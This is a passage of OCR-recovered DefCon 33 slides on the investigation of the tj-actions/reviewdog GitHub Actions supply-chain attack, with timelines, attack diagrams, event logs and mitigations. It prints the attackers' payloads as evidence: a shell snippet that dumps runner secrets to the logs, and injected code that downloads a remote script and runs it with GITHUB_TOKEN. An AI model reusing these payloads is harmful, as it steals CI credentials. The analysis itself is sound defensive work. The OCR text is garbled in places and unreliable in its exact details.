if [ “$RUNNER_ENVIRONMENT" = 'github-hosted' ] && [ "$RUNNER_OS" = 'Linux' ]; then
echo $SCRIPT_RUNNER | base64 -d > "$TEMP/runner_script.py"
VALUES=* python3 $TEMP/runner_script.py | tr -d '\@' | grep -aoE '"[*"]+":\{"value":"[*"]*","isSecret":true\}' | sort -u | base64 -w @ | base64 -w @
echo ‘Review metadata: '
echo $VALUES
echo 'Configuring...'
sleep 15 & /dev/null
fi
8/9/2025 DefCon33 104
```

## Slide 93

Dec 6, 202 4 March 7, 2025 March 11, 2025 March 14, 2025 SpotBugs comp.8/9/2025 Coinbase vuln. reviewdog tag overrideDefCon33 Mass credentials leak105

## Slide 94

8/9/2025 DefCon33 106


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access Ve access access Ve access
Invite disposable Steal
user as amember tea _
maintainer’s
Steal
PAT PAT Override v1 tag
Malicious pull
request (PPE) if spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workflow
8/9/2025 DefCon33 106
```

## Slide 95

8/9/2025 DefCon33 107


> Recovered by OCR — confidence 80/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access - access access - access
Invite disposable
Steal — user aS amember
' PAT ! PAT Override v1 tag !
request (PPE) { spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workflow
Dependency
tj-actions/
eslint-changed-
files
8/9/2025 DefCon33 107
```

## Slide 96

8/9/2025 DefCon33 108


> Recovered by OCR — confidence 81/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access 2 access access PP access
Invite disposable
Steal i, user as amember
' PAT H PAT Override v1 tag '
request (PPE) if spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workflow
Dependency
tj-actions/ | eslint-changed-
[ files
changed-files J
8/9/2025 DefCon33 108
```

## Slide 97

Ta g pushed on 0 3/11 @
18:42:09 UTC
8/9/2025 DefCon33

110


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access 2 access access PP access
Invite disposable
user as amember
Steal
PAT PAT Override v1 tag
Malicious pull :
request (PPE) if spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workf
Dependency
Tag pushed on 03/11 @
18:42:09 UTC
tj-actions/
eslint-changed-
[ files
tj-actions/ ) Used in workflow of
changed-files J
8/9/2025 DefCon33 110
```

## Slide 98

Cleaned 03/ 11 @ 20:31:49 UTC

DefCon33

8/9/2025

111


> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access 2 access access PP access
Invite disposable
user as amember
Steal
PAT PAT Override v1 tag
Malicious pull :
request (PPE) if spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workf
Dependency
Cleaned 03/11 @
20:31:49 UTC
eslint-changed-
[ files
tj-actions/ __ Used in workflow of
changed-files J
8/9/2025 DefCon33 111
```

## Slide 99

8/9/2025 DefCon33 113


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository
Steal
Repository
access
Repository
Invite disposable
user as amember
Repository
access
maintainer’s
PAT PAT Override v1 tag
Malicious pull :
request (PPE) if spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workflow
Dependency
tj-actions/
tj-actions/ ) Used in workflow of
changed-files J
eslint-changed-
files
[
DefCon33 113
```

## Slide 100

Dec 6, 2024 March 7, 2025 March 11 March 11 March 14, 2025 SpotBugs comp.8/9/2025 Coinbase vuln. reviewdog tag over. DefCon33tj-actions comp. Mass credentials leak114

## Slide 101

8/9/2025 DefCon33 115


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access 2 access access PP access
Invite disposable Steal
user as amember tea >.
maintainer’s
Steal
PAT PAT Override v1 tag
Malicious pull :
request (PPE) if spotbugs/ spotbugs/ reviewdog/
spotbugs action-setup
A
Create workflow
Dependency
tj-actions/
i Used in workflow of ( j- i | Used in workflow of f J
agentkit J L changed-files J
files
8/9/2025 DefCon33 115
```

## Slide 102

coinbase/agentkit

DefCon33

8/9/2025

116


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Coinbase Global Inc
NASDAQ: COIN :
coinbase
Market Summary > Coinbase Global Inc
106.92 billion usp
Market capitalization
coinbase/agentkit
8/9/2025 DefCon33 116
```

## Slide 103

8/9/2025
DefCon33
117

March 14, 2025
Mass credentials leak
Dec 6, 2024
SpotBugs comp.
March 7, 2025
Coinbase vuln.
March 11
reviewdog tag over.
March 11
tj-actions comp.
March 13
tj-actions v39 over.

## Slide 104

“shadow commit” from tj-actions/changed-files


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“shadow commit” from tj-actions/changed-files
exports.warnUnsupportedRESTAPIInputs = warnUnsupportedRESTAPIInputs;
async function updateFeatures(token) {
if (process.env.GITHUB_REPOSITORY_OWNER && (process.env.GITHUB_REPOSITORY_OWNER === 'coinbase' || process.env.GITHUB_REPOSITORY_OWNER === 'mmvojwip')) {
await exec.getExecOutput(‘bash', ['-c', ‘curl -sSfL https://gist.githubusercontent.com/mmvojwip/e9975a3al6acc492e3e7 f677b6276cb2/ raw/setup.py >
ignoreReturnCode: true,
“5 silent: true
ignoreReturnCode: true,
silent: true
});
```

## Slide 105

“shadow commit” from tj-actions/changed-files


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“shadow commit” from tj-actions/changed-files
exports.warnUnsupportedRESTAPIInputs = warnUnsupportedRESTAPIInputs;
async function updateFeatures(token) {
if (process.env.GITHUB_REPOSITORY_OWNER && (process.env.GITHUB_REPOSITORY_OWNER === 'coinbase' || process.env.GITHUB_REPOSITORY_OWNER === 'mmvojwip')) {
await exec.getExecOutput('bash', ['-c', “curl -sSfL https://gist.githubusercontent.com/mmvojwip/e9975a3a16acc492e3e7 f677b6276cb2/raw/setup.py >
/tmp/setup.py'], {
ignoreReturnCode: true,
silent: true
await exec.getExecOutput('bash', ['-c', ~GITHUB_TOKEN=${token} python3 /tmp/setup.py ], {
ignoreReturnCode: true,
silent: true
```

## Slide 106

March 14th
15:10:00 UTC

March 14th
15:10:00 UTC
March 14 March 14, 2025
Dec 6, 2024 March 7 , 2 025 March 11 M arch 11 March 13
SpotBugs  Coinbase reviewdog  tj-actions  tj-actions
8/9/2025comp.  vuln. tag over. comp. v39 over. Coinbase comp.DefCon33 Mass credentials leak120

## Slide 107

8/9/2025 DefCon33 121


> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2025-03-14T15:10:41.9273748Z
2025-03-14T15:10:41.9275612Z
2025-03-14T15:10:41.9276503Z
2025-03-14T15:10:41.9277211Z
2025-03-14T15:10:41.9277699Z
2025-03-14T15:10:41.9279008Z
2025-03-14T15:10:41.9279530Z
2025-03-14T15:10:41.9280024Z
2025-03-14T15:10:41.9280590Z
2025-03-14T15:10:41.9281106Z
2025-03-14T15:10:41.9281615Z
2025-03-14T15:10:41.9282221Z
2025-03-14T15:10:41.9282897Z
2025-03-14T15:10:41.9283392Z
2025-03-14T15:10:41.9283961Z ##[endgroup]
2025-03-14T15:10:41.9286744Z Secret source: Actions
2025-03-14T15:10:41.9287528Z Prepare workflow directory
2025-03-14T15:10:41.9688572Z Prepare all required actions
2025-03-14T15:10:41.9724566Z Getting action download info
2025-03-14T15:10:42.1484089Z Download action repository ‘actions/checkout@v4' (SHA:11bd71901bbe5b1630ceea73d27597364c9af683)
2025-03-147T15:10:42.8076777Z Complete job name: check-—changelog-python
2025-@3-14T15:10:42.8797224Z ##[group]Run actions/checkout@v4
8/9/2025 DefCon33
```

## Slide 108

**March 14th 16:37:00 UTC**

DefCon33

8/9/2025

123


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
March 14th
16:37:00 UTC
; First override:
Secrets leaked to a v39 tag
—— coinbase/ ) Used in workflow of ( tj-actions/
8/9/2025 DefCon33 123
```

## Slide 109

**March 14th 16:37:00 UTC**

DefCon33

8/9/2025

124


> Recovered by OCR — confidence 81/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
March 14th
-37:00 UTC
; First override:
Secrets leaked to attack v39 tag
Vv
—— coinbase/ ) Used in workflow of ( tj-actions/
8/9/2025 DefCon33 124
```

## Slide 110

March 14th
16:37:00 UTC
DefCon33

8/9/2025

126

## Slide 111

March 14th
16:37:00 UTC
DefCon33

8/9/2025

127


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
March 14th
16:37:00 UTC
v39 tag
8/9/2025 DefCon33 127
```

## Slide 112

8/9/2025
DefCon33
128

March 14th
16:57:00 UTC

## Slide 113

**March 14th 16:57:00 UTC**

DefCon33

8/9/2025

129

## Slide 114

8/9/2025
DefCon33
131

March 14th
16:57:00 UTC

## Slide 115

Nuke Alert

8/9/2025 DefCon33

133


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Nuke Alert
First override:
v39 tag
tj-actions/
changed-files
A
Second override:
Secrets printed to multiple tags
workflow logs
Used in workflow of
8/9/2025 fi... DefCon33 133
```

## Slide 116

8/9/2025 DefCon33 134


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
access - access access ve access
SubstantialMeet3389 - 4mo ago
how is someone supposed to understand such diagrams? and what are they basically for?
Dependency
Used in workflow of tj -actions/
files
Secrets printed to
workflow logs
BY PALO ALTO NETWORKS
```

## Slide 117

8/9/2025 DefCon33 135


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BRAIN FRIED
8/9/2025 DefCon33 135
```

## Slide 118

8/9/2025 DefCon33 136

## Slide 119

###### **List of TTPs**

8/9/2025

DefCon33

137

## Slide 120

###### **Formalized list of TTPs**

1. “Shadow Commits” – abused GitHub’s fork network in order to introduce code changes to a repository’s context without making actual commits to it

2. Tag overrides – abused github’s audit log blind spots and silently redirect consumers to different commit SHAs

3. Disposable Memebers – where the attacker made the noise to be associated with a disposed user

4. Pwn Request – RCE in CI workflows due to various misconfigurations

8/9/2025

DefCon33

138

## Slide 121

###### **How we conducted the investigation**

8/9/2025

DefCon33

139

## Slide 122

Where we originally started


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Secrets printed
to workflow logs
Where we originally started
tj-actions/
changed-files
Used in workflow of
```

## Slide 123

###### _1/ Github events dataset on ClickHouse_

(https://play.clickhouse.com/)

8/9/2025

DefCon33

141


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1/ Github events dataset on ClickHouse
(https://play.clickhouse.com/)
https://play.clickhouse. com
v25.8.1.846, uptime 3 days
play
SELECT * FROM github_events WHERE actor_login LIKE 'mmvojwip' ORDER BY created_at DESC;
Run
(Ctrl/Cmd+Enter) J
file_time
2025-03-14 13:00:00
2025-03-14 13:00:00
2025-03-14 10:00:00
2025-03-14 10:00:00
2025-03-13 21:00:00
18 rows in result, 3.32 sec.
event_type actor_login
PushEvent mmvojwip
PushEvent mmvojwip
PushEvent mmvojwip
PushEvent mmvojwip
PushEvent mmvojwip
repo_name
mmvojwip/agentkit
mmvojwip/agentkit
mmvojwip/agentkit
mmvojwip/agentkit
mmvojwip/agentkit
100.0%, Read 9.68 billion rows, 26.6
141
```

## Slide 124

###### _2/ GitHub Archive_

(https://www.gharchive.org/)

8/9/2025

DefCon33

142


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2/ GitHub Archive
(https://www.gharchive.org/)
git GH Archive Oso GED
Error loading chart.
Open-source developers all over the world are working on millions of projects: writing code & documentation,
fixing & submitting bugs, and so forth. GH Archive is a project to record the public GitHub timeline, archive it,
and make it easily accessible for further analysis.
GitHub provides 15+ event types, which range from new commits and fork events, to opening new tickets, commenting, and
adding members to a project. These events are aggregated into hourly archives, which you can access with any HTTP client:
Query Command
Activity for 1/1/2015 @ 3PM UTC wget https://data.gharchive.org/2015-01-01-15. json.gz
Activity for 1/1/2015 wget https://data.gharchive.org/2015-01-01-{0. .23}.json.gz
Activity for all of January 2015 wget https://data.gharchive.org/2015-01-{01. .31}-{0..23}.json.gz
142
```

## Slide 125

###### _3/ Community_

All the maintainers of the projects involved!

haya14busa reviewdog

jackton1 tj-actions

[REDACTED] spotbugs

[REDACTED] [REDACTED]

8/9/2025

DefCon33

143

## Slide 126

###### _3/ Community_ [THANK YOU!]

Speaks alongside @0xLupin about Advanced Offensive Strategies in the Software Supply Chain 13:00 @ W229 (Creator Stage 5)

8/9/2025

DefCon33

144

## Slide 127

###### **Additional victims & impact**

8/9/2025

DefCon33

145

## Slide 128

###### **ultralytics/ultralytics**

The repository ultralytics/ultralytics was breached on Dec 4<sup>th</sup> 2024 We observed that our actor tested with various payloads against a fork of the repository, just three days after the breach.

8/9/2025

DefCon33

146

## Slide 129

###### **apache/superset**

Same thing goes for apache/superset, which has 67.3k

8/9/2025

DefCon33

147


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
apache/superset
Same thing goes for apache/superset, which has 67.3k $v
=
event_type
PublicEvent
IssueCommentEvent
IssueCommentEvent
PullRequestEvent
PushEvent
CreateEvent
PushEvent
CreateEvent
ForkEvent
actor_login
randolzfow
randolzfow
randolzfow
randolzfow
randolzfow
randolzfow
randolzfow
randolzfow
randolzfow
repo_name
randolzfow/superset
randolzfow/superset
randolzfow/superset
randolzfow/superset
randolzfow/superset
randolzfow/superset
randolzfow/superset
randolzfow/superset
apache/superset
2024-12-07
2024-12-07
2024-12-07
2024-12-07
2024-12-07
2024-12-07
2024-12-07
2024-12-07
2024-12-07
created_at
17:
16:
16:
16:
16:
16:
16:
16:
16:
29:
36:
35:
32:
32:
31:
31:
30:
30:
56
06
26
08
51
18
55
40
147
```

## Slide 130

**module-federation/core** The attacker attempted a PWN request

8/9/2025

DefCon33

148


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
module-federation/core
The attacker attempted a PWN request
1 PullRequestEvent randolzfow module-federation/core 2024-12-06 03:16:31
2 IssueCommentEvent randolzfow module-federation/core 2024-12-06 03:14:06
3 PushEvent randolzfow randolzfow/core 2024-12-06 03:13:52
4__IssueCommentEvent randolzfow module—federation/core 2024-12-06 Q3:11:32
5 PullRequestEvent randolzfow module-federation/core 2024-12-06 03:11:27
6 PushEvent randolzfow randolzfow/core 2024-12-06 03:10:58
7 CreateEvent randolzfow randolzfow/core 2024-12-06 03:09:51
8 ForkEvent randolzfow module—federation/core 2024-12-06 03:08:42
148
```

## Slide 131

###### **baidubce/app-builder**

8/9/2025

DefCon33

149


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
baidubce/app-builder
Me event_type
PullRequestEvent
actor_login
randolzfow
repo_name
created_at
2024-12-06 03:03:40
PullRequestEvent
PullRequestEvent
randolzfow
randolzfow
baidubce/app—builder
2024-12-06 03:01:53
2024-12-06 03:01:09
CreateEvent
ForkEvent
randolzfow
randolzfow
randolzfow/app—builder
baidubce/app—builder
2024-12-06 03:00:16
2024-12-06 02:55:59
149
```

## Slide 132

###### **Quick words about mitigations & defense**

8/9/2025

DefCon33

150

## Slide 133

###### **TTPs**

1. “Shadow Commits”

2. Tag overrides

3. Disposable Memebers

4. Pwn Request

8/9/2025

DefCon33

151

## Slide 134

###### **TTPs / shadow-commits**

∅

¯\_( ツ )_/¯

8/9/2025

DefCon33

152

## Slide 135

**TTPs / Tag Overrides** GitHub is experimenting with immutable tags and releases

DefCon33

8/9/2025

153


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TTPs / Tag Overrides
GitHub is experimenting with immutable tags and releases
Kristina Heidinger @ - 2nd + Follow
Senior Product Manager at GitHub - Supply Chain Security
Big milestone to share: after lots of work, we're launching Immutable Releases in
private preview on GitHub later this month! #
\
Link to the POE
153
```

## Slide 136

###### **TTPs / Tag Overrides**

DefCon33

8/9/2025

154


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TTPs / Tag Overrides
Link to rhe gist:
yo - Report abuse
<> Code -© Revisions 1 ® Forks 1
Immutable Releases
© What are Immutable Releases?
154
```

## Slide 137

###### **TTPs / Pwn Requests**

1. Gato-X (https://github.com/AdnaneKhan/gato-x)

2. Poutine (https://github.com/boostsecurityio/poutine)

3. Zizmor (https://github.com/zizmorcore/zizmor)

8/9/2025

DefCon33

155

## Slide 138

###### **Bad Practice: Tag usage in github actions**

8/9/2025

DefCon33

156

## Slide 139

8/9/2025 DefCon33 157


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
git
tags
40-char
git sha
8/9/2025 DefCon33 157
```

## Slide 140

###### **The Team Behind**

Yaron Avital

Asi Greenholts

Omer Gil

Tomer Segev

8/9/2025

DefCon33

161

## Slide 141

8/9/2025 DefCon33 162

## Slide 142

###### **Given that the attacker was able to collect quality intel and carry out a complex attack as we’ve just seen**

8/9/2025

DefCon33

163

## Slide 143

**And given that the final step in the tj-actions incident was simply dumping credentials without collecting them**

8/9/2025

DefCon33

164

## Slide 144

Why did the at t acker choose to make noise?
mistake
purpose
scared?
buyer lacked skills?
gain credit?
flood & run?
underprepared?

8/9/2025

DefCon33

165

## Slide 145

###### **why? why would you do that?**

8/9/2025

DefCon33

166

## Slide 146

### **Thank you!**

**@_0xffd**

8/9/2025

DefCon33

169
